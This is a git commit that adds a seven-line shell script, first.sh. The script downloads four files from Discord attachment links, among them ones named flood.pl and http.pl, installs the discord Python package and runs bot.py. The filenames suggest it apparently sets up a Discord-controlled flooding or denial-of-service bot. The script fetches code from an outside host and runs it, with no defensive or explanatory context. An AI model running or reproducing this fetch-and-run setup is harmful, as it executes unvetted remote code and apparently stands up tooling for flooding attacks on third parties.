be58487f09885685eb5d55bfc74760b666aaab60
marl1799 <78597892+marl1799@users.noreply.github.com>
2022-08-17 16:52:57 +0200

    Add files via upload

---
+++ first.sh
@@ -0,0 +1,7 @@
+wget https://cdn.discordapp.com/attachments/999398139276574740/999398259682443456/bot.py
+wget https://cdn.discordapp.com/attachments/999398139276574740/999398246273274066/flood.pl
+wget https://cdn.discordapp.com/attachments/999398139276574740/999398224412561460/gas.py
+wget https://cdn.discordapp.com/attachments/999398139276574740/999398215239618592/http.pl
+echo Downloaded
+pip3 install discord
+python3 bot.py
